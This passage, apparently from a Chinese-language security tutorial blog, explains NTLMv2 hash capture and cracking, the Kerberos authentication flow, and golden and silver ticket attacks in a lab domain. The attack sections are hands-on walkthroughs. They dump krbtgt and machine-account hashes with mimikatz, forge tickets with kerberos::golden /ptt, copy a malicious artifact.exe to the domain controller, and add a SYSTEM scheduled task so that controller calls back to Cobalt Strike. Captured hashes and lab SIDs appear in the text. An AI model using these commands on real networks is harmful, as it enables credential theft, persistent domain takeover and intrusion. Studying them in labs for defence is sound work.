+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">kkk</span>:::<span class="hljs-number">53</span>fb7eb8d40cc777:<span class="hljs-number">3</span>d00ee8a5618f85651098b8005883d5c:<span class="hljs-number">0101000000000000</span>f790f7af9b92d8019cba65f5e39a1ea90000000002000e0042004d002d00320030003000380001000e0042004d002d00320030003000380004000e0042004d002d00320030003000380003000e0042004d002d00320030003000380007000800f790f7af9b92d801060004000200000008003000300000000000000001000000002000009906b326309f0ba76eb46b2271795e5d12df73e87035391df48f0fad1ce073380a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340031002e003100330030000000000000000000<br></code></pre></td></tr></table></figure>
+
+<p>9、使用hashcat 破解密码</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hashcat</span> ‐m <span class="hljs-number">5600</span> kkk:::<span class="hljs-number">53</span>fb7eb8d40cc777:<span class="hljs-number">3</span>d00ee8a5618f85651098b8005883d5c:<span class="hljs-number">0101000000000000</span>f790f7af9b92d8019cba65f5e39a1ea90000000002000e0042004d002d00320030003000380001000e0042004d002d00320030003000380004000e0042004d002d00320030003000380003000e0042004d002d00320030003000380007000800f790f7af9b92d801060004000200000008003000300000000000000001000000002000009906b326309f0ba76eb46b2271795e5d12df73e87035391df48f0fad1ce073380a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340031002e003100330030000000000000000000 <span class="hljs-number">1</span>.txt ‐‐force<br></code></pre></td></tr></table></figure>
+
+<p>1.txt为密码字典</p>
+<p>10、使用hashcat破解得到密码</p>
+<p><img src="/img/image-20231009164435194.png" srcset="/img/loading.gif" lazyload alt="image-20231009164435194"></p>
+<h3 id="抓取HTLMv2值"><a href="#抓取HTLMv2值" class="headerlink" title="抓取HTLMv2值"></a>抓取HTLMv2值</h3><p>使用工具：Inveigh</p>
+<img src="/img/image-20231009164715662.png" srcset="/img/loading.gif" lazyload alt="image-20231009164715662" style="zoom:80%;" />
+
+<p>可以使用cs  3种方式：1.本地导入  2.上传文件到靶机   3.远程执行</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coq">开启监听：<br><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\Inveigh.psd1<br>Invoke-Inveigh -consoleoutput Y <br></code></pre></td></tr></table></figure>
+
+<p>只要有人执行net use即可抓取到HTLMv2值</p>
+<p><img src="/img/image-20231009164910004.png" srcset="/img/loading.gif" lazyload alt="image-20231009164910004"></p>
+<h2 id="3-windows域认证之Kerberos协议认证"><a href="#3-windows域认证之Kerberos协议认证" class="headerlink" title="3.windows域认证之Kerberos协议认证"></a>3.windows域认证之Kerberos协议认证</h2><h3 id="什么是Kerberos协议"><a href="#什么是Kerberos协议" class="headerlink" title="什么是Kerberos协议"></a>什么是Kerberos协议</h3><p>Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机 &#x2F; 服务器应用程序提供强大的认证服务。该 认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并 假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， <strong>Kerberos 作为一种可信任的第三方认证服务</strong>，是通过传统的密码技术（如：共享密钥）执行认证服务的</p>
+<h3 id="Kerberos协议的组成角色"><a href="#Kerberos协议的组成角色" class="headerlink" title="Kerberos协议的组成角色"></a>Kerberos协议的组成角色</h3><p>在古希腊神话故事中，kerberos是一只具有三颗头颅的地狱恶犬，他守护在地狱之外，能够识别所有经此路过的亡 灵，防止活着的入侵者闯入地狱</p>
+<p>kerberos协议中也存在三个角色，分别是</p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">客户端（<span class="hljs-variable">client</span>）：发送请求的一方<br>服务端（<span class="hljs-variable">Server</span>）：接收请求的一方<br>密钥分发中心（<span class="hljs-built_in">Key</span> <span class="hljs-variable">Distribution</span> <span class="hljs-built_in">Center</span>，<span class="hljs-variable">KDC</span>），而密钥分发中心一般又分为两部分，分别是：<br>	<span class="hljs-variable">AS</span>（<span class="hljs-built_in">Authentication</span> <span class="hljs-variable">Server</span>）：认证服务器，专门用来认证客户端的身份并发放客户用于访问<span class="hljs-variable">TGS</span>的<span class="hljs-variable">TGT</span>（票据<br>授予票据）<br>	<span class="hljs-variable">TGS</span>（<span class="hljs-variable">Ticket</span> <span class="hljs-variable">Granting</span> <span class="hljs-variable">Ticket</span>）：票据授予服务器，用来发放整个认证过程以及客户端访问服务端时所需的服务<br>授予票据（<span class="hljs-variable">Ticket</span>）<br></code></pre></td></tr></table></figure>
+
+<h3 id="Kerberos认证的简单流程"><a href="#Kerberos认证的简单流程" class="headerlink" title="Kerberos认证的简单流程"></a>Kerberos认证的简单流程</h3><p>举个例子：</p>
+<p> A现在想要去访问B完成一个任务。但是AB两人之间是从来没有见过面的，他们只知道对方的名字叫A，B。此时如 果A直接去找B告诉B我就是A，那么B是有理由不相信A的，B同理也得不到A的认可，他们陷入了一个无 法证明我 就是我的困境。 </p>
+<p>于是他们就想到了一个办法，AB找到了一个他俩共同信任的人C，且<strong>这个C既认识A又认识B</strong>，所以只要C告诉B，这个A确实就是真正的A那么B就会信任这个A，同理B经过C的认可后，A也会相信B的身份。此后，A在访问B之前会先去找C，C会交给A一个凭证，代表此时的A已经得到了C的认证，这时A拿着凭证再去找B，便可以得到B的确认了。</p>
+<p>再举个例子： </p>
+<p>我们去动物园，动物园不认识你不让你进，你也怕进门后不是动物园，所以就很尴尬</p>
+<p><img src="/img/image-20231009172740642.png" srcset="/img/loading.gif" lazyload alt="image-20231009172740642"></p>
+<p>如何解决呢？我们建立一个售票窗口，只要售票处认识你和动物园，你和动物园之间就可以相互信任。</p>
+<p><img src="/img/image-20231009172805409.png" srcset="/img/loading.gif" lazyload alt="image-20231009172805409"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">人：代表客户端<br>动物园：代表服务端<br>售票处：代表KDC<br></code></pre></td></tr></table></figure>
+
+<p>所以整个kerberos认证流程可以简化描述如下： </p>
+<p>客户端在访问每个想要访问的网络服务时，他需要携带一个专门用于访问该服务并且能够证明自己身份的票据，当服务端收到了该票据他才能认定客户端身份正确，向客户端提供服务。所以整个认证流程可简化为两大步：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">1、客户端向KDC请求获取想要访问的目标服务的服务授予票据（Ticket）；<br>2、客户端拿着从KDC获取的服务授予票据（Ticket）访问相应的网络服务<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231009173548739.png" srcset="/img/loading.gif" lazyload alt="image-20231009173548739"></p>
+<h3 id="Kerberos认证完整流程"><a href="#Kerberos认证完整流程" class="headerlink" title="Kerberos认证完整流程"></a>Kerberos认证完整流程</h3><p>在上述的流程中，其实还有一个问题，那就是 </p>
+<p>1.KDC怎么知道你（客户端）就是真正的客户端？凭什么给你发放服务授予票据（Ticket）呢？</p>
+<p>我们以去动物园为例，售票处凭什么给你买票，你如果是一个逃犯怎么办？其实买票的过程我们可以分为两步第一 才步是你拿着身份证去验证，第二步身份验证通过了才会给你票</p>
+<img src="/img/image-20231009173908563.png" srcset="/img/loading.gif" lazyload alt="image-20231009173908563" style="zoom:80%;" />
+
+<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cos">人：代表客户端<br>动物园：代表服务端<br>售票处：KDC<br>	身份校验人员:<span class="hljs-keyword">AS</span>，负责验证用户身份的合法性，和给用户一个可以买票的票（TGT）<br>	卖票人员：TGS，负责客户端访问服务端时所需的服务授予票据的单位<br></code></pre></td></tr></table></figure>
+
+<p>所以kerberos通信可以分为3步</p>
+<h4 id="通信第一步-客户端和AS进行通信"><a href="#通信第一步-客户端和AS进行通信" class="headerlink" title="通信第一步-客户端和AS进行通信"></a>通信第一步-客户端和AS进行通信</h4><p>​	为了获得能够用来访问服务端服务的票据，客户端首先需要来到KDC获得服务授予票据（Ticket）。由于客户端是第一次访问KDC，此时KDC也不确定该客户端的身份，所以第一次通信的目的为KDC认证客户端身份，确认客户端是一个可靠且拥有访问KDC权限的客户端，</p>
+<p><img src="/img/image-20231009173952708.png" srcset="/img/loading.gif" lazyload alt="image-20231009173952708"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>、客户端用户向KDC以明文的方式发起请求。该次请求中携带了自己的用户名，主机IP，和当前时间戳；<br><span class="hljs-number">2</span>、KDC当中的<span class="hljs-keyword">AS</span>（Authentication <span class="hljs-keyword">Server</span>）接收请求（<span class="hljs-keyword">AS</span>是KDC中专门用来认证客户端身份的认证服务器）后去<br>kerberos认证数据库中根据用户名查找是否存在该用户，此时只会查找是否有相同用户名的用户，并不会判断身份的可<br>靠性；<br><span class="hljs-number">3</span>、如果没有该用户名，认证失败，服务结束；如果存在该用户名，则<span class="hljs-keyword">AS</span>认证中心便认为用户存在，此时便会返回响应给客户端，其中包含两部分内容：<br>	<span class="hljs-number">3.1</span>、第一部分内容称为TGT，他叫做票据授予票据，客户端需要使用TGT去KDC中的TGS（票据授予中心）获取访问网络服务所需的Ticket（服务授予票据），TGT中包含的内容有kerberos数据库中存在的该客户端的<span class="hljs-type">Name</span>，IP，当前时间戳，客户端即将访问的TGS的<span class="hljs-type">Name</span>，TGT的有效时间以及用于客户端和TGS间进行通信的Session_key(CT_SK)。<br>整个TGT使用TGS密钥加密，客户端是解密不了的，由于密钥从没有在网络中传输过，所以也不存在密钥被劫持破解的情况。<br>	<span class="hljs-number">3.2</span>第二部分内容是使用客户端密钥加密的一段内容，其中包括用于客户端和TGS间通信的Session_key(CT_SK),客户端即将访问的TGS的<span class="hljs-type">Name</span>以及TGT的有效时间，和一个当前时间戳。该部分内容使用客户端密钥加密，所以客户端在拿到该部分内容时可以通过自己的密钥解密。如果是一个假的客户端，那么他是不会拥有真正客户端的密钥的，因为该密钥也从没在网络中进行传输过。这也同时认证了客户端的身份，如果是假客户端会由于解密失败从而终端认证流程。<br>至此，第一次通信完成。<br></code></pre></td></tr></table></figure>
+
+<h4 id="通信第二步-客户端和TGS进行通信"><a href="#通信第二步-客户端和TGS进行通信" class="headerlink" title="通信第二步-客户端和TGS进行通信"></a>通信第二步-客户端和TGS进行通信</h4><p>​	此时的客户端收到了来自KDC（其实是AS）的响应，并获取到了其中的两部分内容。此时客户端会用自己的密钥将 第二部分内容进行解密，分别获得时间戳，自己将要访问的TGS的信息，和用于与TGS通信时的密钥CT_SK。首先 他会根据时间戳判断该时间戳与自己发送请求时的时间之间的差值是否大于5分钟，如果大于五分钟则认为该AS是 伪造的，认证至此失败。如果时间戳合理，客户端便准备向TGS发起请求</p>
+<p><img src="/img/image-20231009174038108.png" srcset="/img/loading.gif" lazyload alt="image-20231009174038108"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">客户端行为：<br><span class="hljs-number">1</span>、客户端使用CT_SK加密将自己的客户端信息发送给KDC，其中包括客户端名，IP，时间戳；<br><span class="hljs-number">2</span>、客户端将自己想要访问的<span class="hljs-keyword">Server</span>服务以明文的方式发送给KDC；<br><span class="hljs-number">3</span>、客户端将使用TGS密钥加密的TGT也原封不动的也携带给KDC；<br><br>TGS行为：<br><span class="hljs-number">1</span>、此时KDC中的TGS（票据授予服务器）收到了来自客户端的请求。他首先根据客户端明文传输过来的<span class="hljs-keyword">Server</span>服务IP查看当前kerberos系统中是否存在可以被用户访问的该服务。如果不存在，认证失败结束。如果存在，继续接下来的认证。<br><span class="hljs-number">2</span>、TGS使用自己的密钥将TGT中的内容进行解密，此时他看到了经过<span class="hljs-keyword">AS</span>认证过后并记录的用户信息，一把Session_KEY即CT_SK，还有时间戳信息，他会现根据时间戳判断此次通信是否真是可靠有无超出时延。<br><span class="hljs-number">3</span>、如果时延正常，则TGS会使用CT_SK对客户端的第一部分内容进行解密（使用CT_SK加密的客户端信息），取出其中的用户信息和TGT中的用户信息进行比对，如果全部相同则认为客户端身份正确，方可继续进行下一步。<br><span class="hljs-number">4</span>、此时KDC将返回响应给客户端，响应内容包括：<br>	第一部分：用于客户端访问网络服务的使用<span class="hljs-keyword">Server</span>密码加密的ST（Servre Ticket），其中包括客户端的<span class="hljs-type">Name</span>，IP，需要访问的网络服务的地址<span class="hljs-keyword">Server</span> IP，ST的有效时间，时间戳以及用于客户端和服务端之间通信CS_SK（<span class="hljs-keyword">Session</span> Key）。<br>	第二部分：使用CT_SK加密的内容，其中包括CS_SK和时间戳，还有ST的有效时间。由于在第一次通信的过程中，<span class="hljs-keyword">AS</span>已将CT_SK通过客户端密码加密交给了客户端，且客户端解密并缓存了CT_SK，所以该部分内容在客户端接收到时是可以自己解密的。至此，第二次通信完成。<br></code></pre></td></tr></table></figure>
+
+<h4 id="通信第三步-客户端和服务端进行通信"><a href="#通信第三步-客户端和服务端进行通信" class="headerlink" title="通信第三步-客户端和服务端进行通信"></a>通信第三步-客户端和服务端进行通信</h4><p>​	此时的客户端收到了来自KDC（TGS）的响应，并使用缓存在本地的CT_SK解密了第二部分内容（第一部分内容中 的ST是由Server密码加密的，客户端无法解密），检查时间戳无误后取出其中的CS_SK准备向服务端发起最后的请求。</p>
+<p><img src="/img/image-20231009174117654.png" srcset="/img/loading.gif" lazyload alt="image-20231009174117654"></p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arduino">客户端：<br><span class="hljs-number">1</span>、客户端使用CS_SK将自己的主机信息和时间戳进行加密作为交给服务端的第一部分内容，然后将ST（服务授予票据）<br>作为第二部分内容都发送给服务端。<br>服务端：<br><span class="hljs-number">1</span>、服务器此时收到了来自客户端的请求，他会使用自己的密钥，即<span class="hljs-built_in">Server</span>密钥将客户端第二部分内容进行解密，核对时间戳之后将其中的CS_SK取出，使用CS_SK将客户端发来的第一部分内容进行解密，从而获得经过TGS认证过后的客户端信息，此时他将这部分信息和客户端第二部分内容带来的自己的信息进行比对，最终确认该客户端就是经过了KDC认证的具有真实身份的客户端，是他可以提供服务的客户端。此时服务端返回一段使用CT_SK加密的表示接收请求的响应给客户端，在客户端收到请求之后，使用缓存在本地的CS_ST解密之后也确定了服务端的身份（其实服务端在通信的过程中还会使用数字证书证明自己身份）。<br>至此，第三次通信完成。此时也代表着整个kerberos认证的完成，通信的双方都确认了对方的身份，此时便可以放心的进行整个网络通信了。<br></code></pre></td></tr></table></figure>
+
+<p>总体流程如下</p>
+<p><img src="/img/image-20231009174149420.png" srcset="/img/loading.gif" lazyload alt="image-20231009174149420"></p>
+<h2 id="4-Golden-Ticket黄金票据制作原理及利用方式"><a href="#4-Golden-Ticket黄金票据制作原理及利用方式" class="headerlink" title="4.Golden Ticket黄金票据制作原理及利用方式"></a>4.Golden Ticket黄金票据制作原理及利用方式</h2><h3 id="Krbtgt账户介绍"><a href="#Krbtgt账户介绍" class="headerlink" title="Krbtgt账户介绍"></a>Krbtgt账户介绍</h3><p>krbtgt用户，<strong>是系统在创建域时自动生成的一个帐号</strong>，其作用是<strong>密钥分发中心的服务账号</strong>，其密码是系统随机生成 的，无法登录主机</p>
+<p><img src="/img/image-20231010145650895.png" srcset="/img/loading.gif" lazyload alt="image-20231010145650895"></p>
+<h3 id="黄金票据原理"><a href="#黄金票据原理" class="headerlink" title="黄金票据原理"></a>黄金票据原理</h3><p><strong>本质：伪造TGT</strong></p>
+<p><strong>用途：权限维持</strong></p>
+<p>TGT&#x3D;Krbtgt的ntlm hash 加密 </p>
+<p>1、Kerberos中的TGT和Logon Session Key（CT_SK）是AS返回的 ，TGT它是由Krbtgt加密和签名的 ,krbtgt的 NTLM Hash又是固定的,而CT_SK并不会保存在KDC中。 </p>
+<p>2、所以只要得到krbtgt的NTLM Hash，就可以伪造TGT和Logon Session Key（CT_SK）。 </p>
+<p>3、Client与TGS的交互中，而已有了金票后（TGT）,就跳过AS验证,不用验证账户和密码,所以也不担心域管密码修改。</p>
+<p>当我们获得域控的控制权限后，有可能获取域内所有用户的hash，和krbtgt的hash。这时，由于一些原因导致我 们失去对目标的控制权，但是我们还留有一个普通用户的权限，并且krbtgt的密码没有更改，此时我们可以<strong>利用 krbtgt用户的ntlm hash制作黄金票据伪造TGT，重新获取域控的管理权限。</strong></p>
+<p><img src="/img/image-20231010145937348.png" srcset="/img/loading.gif" lazyload alt="image-20231010145937348"></p>
+<p>我们在以去动物园为例，当我们去买票的时候，我么首先第一步是去身份认证管理员那里认证身份</p>
+<p><img src="/img/image-20231010145956811.png" srcset="/img/loading.gif" lazyload alt="image-20231010145956811"></p>
+<h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><h4 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h4><table>
+<thead>
+<tr>
+<th>实验机器</th>
+<th>IP地址</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>windows Server 2012(域控)</td>
+<td>10.210.100.10</td>
+</tr>
+<tr>
+<td>windows Server 2008(域内成员)</td>
+<td>10.210.100.20</td>
+</tr>
+</tbody></table>
+<h4 id="实验前提"><a href="#实验前提" class="headerlink" title="实验前提"></a>实验前提</h4><p>1、已经控制了域名并且使用域管理员登录或者提权的system </p>
+<p>如果域管理员发现了你控制了域控机器，把你的后门删除了，那么就不能继续控制域控了，这个时候当我们可以伪造TGT重新获得域控的权限 条件如下：</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-number">1</span>、域名称<br><span class="hljs-number">2</span>、域的SID值<br><span class="hljs-number">3</span>、域的KRBTGT账号的<span class="hljs-built_in">HASH</span><br><span class="hljs-number">4</span>、伪造任意用户名<br>（获取域的SID和KRBTGT账号的NTLM <span class="hljs-built_in">HASH</span>的前提是需要已经拿到了域的权限）<br></code></pre></td></tr></table></figure>
+
+<h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h4><p>1、目前已经控制了域控和域内机器</p>
+<p><img src="/img/image-20231010152245413.png" srcset="/img/loading.gif" lazyload alt="image-20231010152245413"></p>
+<p>2、获取关键信息</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> <span class="hljs-built_in">whoami</span> /user 获取域的sid值(去掉最后的‐500，500表示为administrator用户)</span><br><span class="hljs-keyword">shell</span><span class="language-bash"> net config workstation 查看域</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231010152411743.png" srcset="/img/loading.gif" lazyload alt="image-20231010152411743"></p>
+<p>域sid：S-1-5-21-2431442348-1717482385-2017137259</p>
+<p><img src="/img/image-20231010152459188.png" srcset="/img/loading.gif" lazyload alt="image-20231010152459188"></p>
+<p>域名称：hack.com</p>
+<p>3、使用mimikatz导出KRBTGT的ntlm hash</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz lsadump::dcsync <span class="hljs-regexp">/domain:hack.com /u</span>ser:krbtgt<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231010152736649.png" srcset="/img/loading.gif" lazyload alt="image-20231010152736649"></p>
+<p><img src="/img/image-20231010152811590.png" srcset="/img/loading.gif" lazyload alt="image-20231010152811590"></p>
+<p>得到krbtgt的ntlm hash：4d81c6ab6cabae0fc304cd309f601a0b</p>
+<p>4、这个时候突然域控下线了，管理员发现的你在控制，把后门清理了</p>
+<p><img src="/img/image-20231010153142329.png" srcset="/img/loading.gif" lazyload alt="image-20231010153142329"></p>
+<p><img src="/img/image-20231010153848759.png" srcset="/img/loading.gif" lazyload alt="image-20231010153848759"></p>
+<p>5、因为之前已经记录了关键信息，我们现在就可以伪造任意用户访问域控，windows 2008机器必须是域内用户或者system用户</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mimikatz kerberos::tgt 查票<br>mimikatz kerberos::purge 清票<br></code></pre></td></tr></table></figure>
+
+<p>使用cs制作黄金票据</p>
+<p><img src="/img/image-20231010153946573.png" srcset="/img/loading.gif" lazyload alt="image-20231010153946573"></p>
+<p><img src="/img/image-20231010154044275.png" srcset="/img/loading.gif" lazyload alt="image-20231010154044275"></p>
+<p><img src="/img/image-20231010154226444.png" srcset="/img/loading.gif" lazyload alt="image-20231010154226444"></p>
+<p>6、使用dir 远程访问域控</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> <span class="hljs-built_in">dir</span> \\dc.hack.com\c$</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231010154304566.png" srcset="/img/loading.gif" lazyload alt="image-20231010154304566"></p>
+<p>7、使用计划任务上线cs </p>
+<p>copy当前控制的靶机的恶意文件到域控的C盘</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">shell</span> <span class="hljs-keyword">copy</span> <span class="hljs-keyword">c</span>:\users\administrator\desktop\artifact.<span class="hljs-keyword">exe</span> \\dc.hack.<span class="hljs-keyword">com</span>\<span class="hljs-keyword">c</span>$<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231010154917002.png" srcset="/img/loading.gif" lazyload alt="image-20231010154917002"></p>
+<p>设置计划任务到域控   名字test 开机启动 c:\artifact.exe  以system权限</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> schtasks /create /s dc.hack.com /tn <span class="hljs-built_in">test</span> /sc onstart /tr c:\artifact.exe /ru system /f</span><br></code></pre></td></tr></table></figure>
+
+<p>运行计划任务</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> schtasks /run /s dc.hack.com /i /tn <span class="hljs-string">&quot;test&quot;</span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231010155130795.png" srcset="/img/loading.gif" lazyload alt="image-20231010155130795"></p>
+<p>域控上线</p>
+<p><img src="/img/image-20231010155137094.png" srcset="/img/loading.gif" lazyload alt="image-20231010155137094"></p>
+<h2 id="5-Silver-Ticket白银票据制作原理及利用方式"><a href="#5-Silver-Ticket白银票据制作原理及利用方式" class="headerlink" title="5.Silver Ticket白银票据制作原理及利用方式"></a>5.Silver Ticket白银票据制作原理及利用方式</h2><p><strong>本质：伪造ST</strong></p>
+<h3 id="服务账号"><a href="#服务账号" class="headerlink" title="服务账号"></a>服务账号</h3><p>服务账号就是计算机名字+$用来管理服务的账号</p>
+<h3 id="白银票据原理"><a href="#白银票据原理" class="headerlink" title="白银票据原理"></a>白银票据原理</h3><p><strong>如果说黄金票据是伪造的TGT,那么白银票据就是伪造的ST</strong>。 在Kerberos认证的第三步，Client带着ST和 Authenticator3向Server上的某个服务进行请求，Server接收到Client的请求之后,通过自己的Master Key 解密ST, 从而获得 Session Key。通过 Session Key 解密 Authenticator3,进而验证对方的身份,验证成功就让 Client 访问 server上的指定服务了。所以我们只需要知道<strong>Server用户的Hash就可以伪造出一个ST,且不会经过KDC,但是伪造的门票只对部分服务起作用。</strong></p>
+<p><img src="/img/image-20231010161311015.png" srcset="/img/loading.gif" lazyload alt="image-20231010161311015"></p>
+<p>我们以去动物园举例</p>
+<p><img src="/img/image-20231010161346581.png" srcset="/img/loading.gif" lazyload alt="image-20231010161346581"></p>
+<h3 id="实验-1"><a href="#实验-1" class="headerlink" title="实验"></a>实验</h3><h4 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h4><table>
+<thead>
+<tr>
+<th>实验机器</th>
+<th>IP地址</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>windows Server 2012（域控）</td>
+<td>10.210.100.10</td>
+</tr>
+<tr>
+<td>windows Server 2008（域内成员）</td>
+<td>10.210.100.20</td>
+</tr>
+<tr>
+<td>windows Server 2003（域内成员）</td>
+<td>10.210.100.30</td>
+</tr>
+</tbody></table>
+<h4 id="实验前提-1"><a href="#实验前提-1" class="headerlink" title="实验前提"></a>实验前提</h4><p>1、已经控制了域控并且使用域管理员登录或者提权的system </p>
+<p>我们的目的是去访问windows server 2003 的机器</p>
+<p>条件如下：</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-number">1.</span>域名<br><span class="hljs-number">2.</span>域sid<br><span class="hljs-number">3.</span>目标服务器名<br><span class="hljs-number">4.</span>可利用的服务<br><span class="hljs-number">5.</span>服务账号的NTML <span class="hljs-built_in">HASH</span><br><span class="hljs-number">6.</span>需要伪造的用户名<br></code></pre></td></tr></table></figure>
+
+<h4 id="实验步骤-1"><a href="#实验步骤-1" class="headerlink" title="实验步骤"></a>实验步骤</h4><p>控制域控</p>
+<p>1、获取基本信息</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> <span class="hljs-built_in">whoami</span> /user 获取域的sid值(去掉最后的‐500，500表示为administrator用户)</span><br><span class="hljs-keyword">shell</span><span class="language-bash"> net config workstation 查看域</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231010163307144.png" srcset="/img/loading.gif" lazyload alt="image-20231010163307144"></p>
+<p><img src="/img/image-20231010163322321.png" srcset="/img/loading.gif" lazyload alt="image-20231010163322321"></p>
+<p>域名：hack.com  SID：S-1-5-21-2431442348-1717482385-2017137259</p>
+<p>2、获取服务账号的ntlm hash值</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mimikatz sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231010163543546.png" srcset="/img/loading.gif" lazyload alt="image-20231010163543546"></p>
+<p>服务账号DC$的ntlm hash值：a2b973c420b7df773e05ed5d780cdc7c</p>
+<p>3、伪造票据（CIFS共享服务）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz kerberos::tgt 查票<br>mimikatz kerberos::purge 清票<br>shell klist 查票<br>shell klist purge 清票<br><br>mimikatz kerberos::golden /domain:hack.com /sid:S-1-5-21-2431442348-1717482385-2017137259<br>/target:dc.hack.com /service:cifs /rc4:a2b973c420b7df773e05ed5d780cdc7c /user:abcd /ptt<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231010163930167.png" srcset="/img/loading.gif" lazyload alt="image-20231010163930167"></p>
+<p><img src="/img/image-20231010164116810.png" srcset="/img/loading.gif" lazyload alt="image-20231010164116810"></p>
+<p>4、访问域控</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> <span class="hljs-built_in">dir</span> \\dc.hack.com\c$</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231010164225754.png" srcset="/img/loading.gif" lazyload alt="image-20231010164225754"></p>
+<p>6、伪造票据（LDAP共享服务）</p>
